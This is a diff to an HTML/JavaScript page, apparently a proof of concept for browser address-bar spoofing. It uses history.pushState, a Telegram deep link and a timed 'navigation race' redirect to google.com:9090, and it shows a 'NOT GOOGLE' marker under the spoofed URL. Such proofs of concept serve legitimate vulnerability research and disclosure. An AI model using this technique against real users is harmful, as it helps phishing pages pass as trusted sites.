@@ -32,7 +32,7 @@ button {
 }
 
 #spoof {
-  display: none; /* muncul BELAKANGAN */
+  display: none;
   margin-top: 20px;
   font-size: 28px;
   font-weight: 600;
@@ -49,31 +49,29 @@ button {
 </div>
 
 <script>
-function logEvent() {}
-
 const spoof = document.getElementById('spoof');
 
-/* Klik START */
 function start() {
+  /* history manipulation */
   history.pushState({}, '', '/trusted');
 
+  /* open Telegram */
   setTimeout(() => {
     location.href = 'tg://resolve?domain=telegram';
   }, 200);
+
+  /* tampilkan NOT GOOGLE setelah 3 detik */
+  setTimeout(() => {
+    spoof.style.display = 'block';
+  }, 1900);
 }
 
-/* Navigation race */
+/* navigation race */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
         location.href = 'https://google.com:9090';
-
-        /* tampilkan teks SETELAH URL berubah */
-        setTimeout(() => {
-          spoof.style.display = 'block';
-        }, 50);
-
       }, 80);
     });
   });
